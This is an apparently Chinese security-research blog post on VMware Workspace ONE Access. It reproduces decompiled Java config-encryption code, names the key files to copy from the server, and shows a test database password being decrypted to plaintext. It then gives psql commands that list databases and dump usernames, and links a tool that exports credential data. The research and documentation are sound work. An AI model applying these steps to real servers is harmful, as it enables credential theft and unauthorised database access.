---
layout: post
title: VMware Workspace ONE Access调试分析——数据库口令的破解
---


## 0x00 前言
---

在上篇文章《VMware Workspace ONE Access漏洞调试环境搭建》提到连接数据库的口令加密保存在文件`/usr/local/horizon/conf/runtime-config.properties`中，本文将要基于调试环境，分析加密流程，介绍详细的解密方法。

## 0x01 简介
---

本文将要介绍以下内容

- 加密流程
- 解密方法
- 数据库操作

## 0x02 加密流程
---

### 1.定位关键文件

经过一段时间的寻找，找到实现加密功能对应的文件为`/opt/vmware/certproxy/lib/horizon-config-encrypter-0.15.jar`

反编译获得加密的实现代码如下：

```
    public final String encrypt(byte[] data) {
        if (data != null && data.length != 0) {
            if (!this.getKeyMgmt().randomKeyEnabled() && !this.getKeyMgmt().customKeysAvailable()) {
                log.error("No custom encryption keys available, aborting encrypt.");
                return null;
            } else {
                Cipher encryptCipher = this.getEncryptCipher();

                try {
                    if (encryptCipher != null) {
                        byte[] utf8 = ArrayUtils.addAll(encryptCipher.getIV(), encryptCipher.doFinal(data));
                        ByteBuffer keyBuffer = ByteBuffer.allocate(2);
                        keyBuffer.putShort(this.getKeyMgmt().getCurrentKey());
                        utf8 = ArrayUtils.addAll(keyBuffer.array(), utf8);
                        utf8 = ArrayUtils.insert(0, utf8, new byte[]{(byte)this.getKeyMgmt().getCurrentCipherVersion()});
                        byte[] dec = Base64.encodeBase64(utf8);
                        return new String(dec, StandardCharsets.US_ASCII);
                    }
                } catch (IllegalBlockSizeException | IllegalStateException | BadPaddingException var6) {
                    log.error(var6.getMessage(), var6);
                }

                return null;
            }
        } else {
            return null;
        }
    }
```

### 2.动态调试

为了提高分析效率，采取动态调试的方法，流程如下：

#### (1)新建Java工程

下载VMware Workspace ONE Accessd服务器中`/opt/vmware/certproxy/lib/`下的所有jar文件并保存，在Java工程导入以上jar文件

新建package：`com.vmware.horizon.common.utils.config`

新建文件ConfigEncrypterImpl.java，内容如下：

```

package com.vmware.horizon.common.utils.config;

import com.google.common.annotations.VisibleForTesting;
import com.vmware.horizon.api.ConfigEncrypter;
import com.vmware.horizon.random.SecureRandomUtils;
import com.vmware.horizon.security.SecurityProviderHelper;
import java.nio.ByteBuffer;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import javax.annotation.Nonnull;
import javax.annotation.Nullable;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.lang3.ArrayUtils;
import org.apache.commons.lang3.StringUtils;
import org.bouncycastle.crypto.fips.FipsUnapprovedOperationError;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class ConfigEncrypterImpl implements ConfigEncrypter {
    public static final Charset encodingCharset;
    private static final Logger log;
    private static final SecureRandom srand;
    private static ConfigEncrypterImpl staticKeyInstance;
    private static final ConfigEncrypterImpl randomKeyInstance;
    private static final Object keyInstanceLock;
    private ConfigEncrypterKeyMgmt keyMgmt;

    private static ConfigEncrypterImpl createRandomKeyInstance() {
        SecurityProviderHelper.initializeSecurityProvider();
        return new ConfigEncrypterImpl(false);
    }

    public static ConfigEncrypterImpl getInstance() {
        synchronized(keyInstanceLock) {
            if (staticKeyInstance == null) {
                staticKeyInstance = new ConfigEncrypterImpl(true);
            }

            return staticKeyInstance;
        }
    }

    public static ConfigEncrypterImpl getRandomKeyInstance() {
        return randomKeyInstance;
    }

    private ConfigEncrypterImpl(boolean useStaticKey) {
        if (useStaticKey && Boolean.parseBoolean(ConfigPropertiesUtil.getProperties().getProperty("components.configEncrypter.kms.enable"))) {
            log.info("Not initializing static config keystore. Using KMS for secure config properties");
            this.keyMgmt = null;
        } else {
            this.keyMgmt = new ConfigEncrypterKeyMgmt(useStaticKey);
        }

    }

    @VisibleForTesting
    ConfigEncrypterImpl(ConfigEncrypterKeyMgmt keyMgmt) {
        this.keyMgmt = keyMgmt;
    }

    @Nullable
    public final String decrypt(String data) {
        if (StringUtils.isBlank(data)) {
            return null;
        } else {
            byte[] encrypted = data.getBytes(encodingCharset);

            boolean b64;
            try {
                b64 = Base64.isBase64(encrypted);
            } catch (ArrayIndexOutOfBoundsException var11) {
                b64 = false;
            }

            if (b64) {
                encrypted = Base64.decodeBase64(encrypted);
            }

            if (ArrayUtils.isEmpty(encrypted)) {
                return null;
            } else {
                int cipherVersion = Math.abs(encrypted[0]);
                Cipher decryptCipher = null;
                if (cipherVersion >= this.getKeyMgmt().getMinCipherVersion() && cipherVersion <= this.getKeyMgmt().getMaxCipherVersion()) {
                    encrypted = ArrayUtils.remove(encrypted, 0);
                    short keyIdx = ByteBuffer.wrap(encrypted, 0, 2).getShort(0);
                    encrypted = ArrayUtils.subarray(encrypted, 2, encrypted.length);
                    decryptCipher = this.getDecryptCipher(cipherVersion, this.getKeyMgmt().getKey(keyIdx), encrypted);
                }

                if (decryptCipher != null) {
                    encrypted = ArrayUtils.subarray(encrypted, this.getKeyMgmt().getCipherNonceSize(cipherVersion, decryptCipher.getBlockSize()), encrypted.length);

                    try {
                        byte[] utf8 = decryptCipher.doFinal(encrypted);
                        if (utf8.length > 0) {
                            return new String(utf8, encodingCharset);
                        }

                        log.debug("zero length decryption");
                    } catch (BadPaddingException var7) {
                        log.debug("Failed to decrypt the given value (padding)");
                    } catch (IllegalBlockSizeException var8) {
                        log.debug("Failed to decrypt the given value (block size)");
                    } catch (ArrayIndexOutOfBoundsException var9) {
                        log.debug("Failed to decrypt the given value (mac verification)");
                    } catch (IllegalStateException var10) {
                        log.debug("Failed to decrypt the given value (illegal state)");
                    }
                }

                return null;
            }
        }
    }

    @Nullable
    public final String encrypt(@Nonnull String data) {
        return StringUtils.isBlank(data) ? null : this.encrypt(data.getBytes(encodingCharset));
    }

    @Nullable
    public final String encrypt(byte[] data) {
        if (data != null && data.length != 0) {
            if (!this.getKeyMgmt().randomKeyEnabled() && !this.getKeyMgmt().customKeysAvailable()) {
                log.error("No custom encryption keys available, aborting encrypt.");
                return null;
            } else {
                Cipher encryptCipher = this.getEncryptCipher();

                try {
                    if (encryptCipher != null) {
                        byte[] utf8 = ArrayUtils.addAll(encryptCipher.getIV(), encryptCipher.doFinal(data));
                        ByteBuffer keyBuffer = ByteBuffer.allocate(2);
                        keyBuffer.putShort(this.getKeyMgmt().getCurrentKey());
                        utf8 = ArrayUtils.addAll(keyBuffer.array(), utf8);
                        utf8 = ArrayUtils.insert(0, utf8, new byte[]{(byte)this.getKeyMgmt().getCurrentCipherVersion()});
                        byte[] dec = Base64.encodeBase64(utf8);
                        return new String(dec, StandardCharsets.US_ASCII);
                    }
                } catch (IllegalBlockSizeException | IllegalStateException | BadPaddingException var6) {
                    log.error(var6.getMessage(), var6);
                }

                return null;
            }
        } else {
            return null;
        }
    }

    @Nullable
    private Cipher getDecryptCipher(int cipherVersion, byte[] decryptionKey, byte[] iv) {
        Cipher decryptCipher = null;
        if (!ArrayUtils.isEmpty(iv)) {
            try {
                decryptCipher = Cipher.getInstance(this.getKeyMgmt().getCipher(cipherVersion), SecurityProviderHelper.getJceProvider());
                IvParameterSpec ivSpec = new IvParameterSpec(ArrayUtils.subarray(iv, 0, this.getKeyMgmt().getCipherNonceSize(cipherVersion, decryptCipher.getBlockSize())));
                SecretKey secret = new SecretKeySpec(decryptionKey, this.getKeyMgmt().getCipher(cipherVersion));
                decryptCipher.init(2, secret, ivSpec, srand);
            } catch (InvalidAlgorithmParameterException | InvalidKeyException | NoSuchAlgorithmException | NoSuchPaddingException | IllegalArgumentException | FipsUnapprovedOperationError var7) {
                log.error(var7.getMessage(), var7);
                decryptCipher = null;
            }
        }

        return decryptCipher;
    }

    @Nullable
    private Cipher getEncryptCipher() {
        Cipher encryptCipher = null;

        try {
            encryptCipher = Cipher.getInstance(this.getKeyMgmt().getCipher(), SecurityProviderHelper.getJceProvider());
            byte[] iv = new byte[this.getKeyMgmt().getCipherNonceSize(encryptCipher.getBlockSize())];
            srand.nextBytes(iv);
            SecretKey secret = new SecretKeySpec(this.getKeyMgmt().getKey(), this.getKeyMgmt().getCipher());
            IvParameterSpec ivSpec = new IvParameterSpec(iv);
            encryptCipher.init(1, secret, ivSpec, srand);
        } catch (InvalidAlgorithmParameterException | IllegalArgumentException | NoSuchPaddingException | NoSuchAlgorithmException | InvalidKeyException | FipsUnapprovedOperationError var5) {
            log.error(var5.getMessage(), var5);
        }

        return encryptCipher;
    }

    @VisibleForTesting
    ConfigEncrypterKeyMgmt getKeyMgmt() {
        return this.keyMgmt;
    }

    @VisibleForTesting
    public void setCustomEncryptionKeystorePath(@Nonnull String path) {
        this.getKeyMgmt().setCustomEncryptionKeystorePath(path);
    }

    public final boolean generateNewEncryptionKey() {
        return this.getKeyMgmt().generateNewEncryptionKey();
    }

    public static void main(String[] values) {
        String value = "1234567890";
        ConfigEncrypterImpl encrypter = getInstance();
        System.out.println(encrypter.encrypt(value));
    }

    static {
        encodingCharset = StandardCharsets.ISO_8859_1;
        log = LoggerFactory.getLogger(ConfigEncrypterImpl.class);
        srand = SecureRandomUtils.getSecureRandomInstance();
        randomKeyInstance = createRandomKeyInstance();
        keyInstanceLock = new Object();
    }
}
```

#### (2)动态调试

IDEA设置好远程调试参数，开启远程调试，分析结果如下：

在初始化过程中，需要读取文件`\usr\local\horizon\conf\runtime-config.properties`，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2022-4-25/2-1.png)

加密过程需要读取密钥文件1`\usr\local\horizon\conf\configkeystore.pass`，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2022-4-25/2-2.png)

加密过程需要读取密钥文件2`\usr\local\horizon\conf\configkeystore.bcfks`，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2022-4-25/2-3.png)

#### (3)实现加密功能

在VMware Workspace ONE Accessd服务器下载以下文件：

- \usr\local\horizon\conf\runtime-config.properties
- \usr\local\horizon\conf\configkeystore.pass
- \usr\local\horizon\conf\configkeystore.bcfks

保存至`C:\test`

修改以下变量：

- `DEFAULT_PROPERTIES_FILE = "c:\\test\\runtime-config.properties";`
- `CUSTOM_ENCRYPTION_KEYSTORE_PATH = "c:\\test\\";`

实现加密功能，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2022-4-25/2-4.png)

## 0x03 解密方法
---

### 1.获取连接数据库的加密口令

加密数据对应文件`/usr/local/horizon/conf/runtime-config.properties`中的`secure.datastore.jdbc.password`

我的测试环境内容为`BAACs8MW1xyMe7/8ONd2QwtG3mw37wF1/1pQ6D09xXqf56ncfRtCun6y8A1XFtjajhU60V1QNYnCOxk3t1m0dV0JvA==`，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2022-4-25/2-5.png)

### 2.数据解密

代码如下：

```
        String devalue = "BAACs8MW1xyMe7/8ONd2QwtG3mw37wF1/1pQ6D09xXqf56ncfRtCun6y8A1XFtjajhU60V1QNYnCOxk3t1m0dV0JvA==";
        System.out.println(encrypter.decrypt(devalue));
```

解密出明文口令`KuxmsscstQhxnqeFBzawyyML-Dascx0i`，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2022-4-25/2-6.png)

同`/usr/local/horizon/conf/db.pwd`中的内容一致，解密成功

## 0x04 数据库操作
---

#### (1)查看所有数据库

`psql -h localhost -U horizon -l`

输入连接口令`KuxmsscstQhxnqeFBzawyyML-Dascx0i`

查询结果如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2022-4-25/3-1.png)

存储数据的数据库为`saas`

#### (2)导出用户表信息

`psql -h localhost -U horizon -c 'SELECT "strUsername" FROM "Users";' -d saas -W`

输入连接口令`KuxmsscstQhxnqeFBzawyyML-Dascx0i`

这里需要注意，对于PostgreSql数据库，查询含有大写字母的字段必须加双引号，否则报错提示找不到表名

查询结果如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2022-4-25/3-2.png)

以上操作的Golang语言实现代码已上传至github，地址如下：

https://github.com/3gstudent/Homework-of-Go/blob/master/WorkspaceONE_Query_PostgreSQL.go

导出口令信息，结果如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2022-4-25/3-3.png)

## 0x05 小结
---

本文介绍了利用VMware Workspace ONE Access漏洞调试环境破解数据库加密口令的方法，记录技术细节。


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)

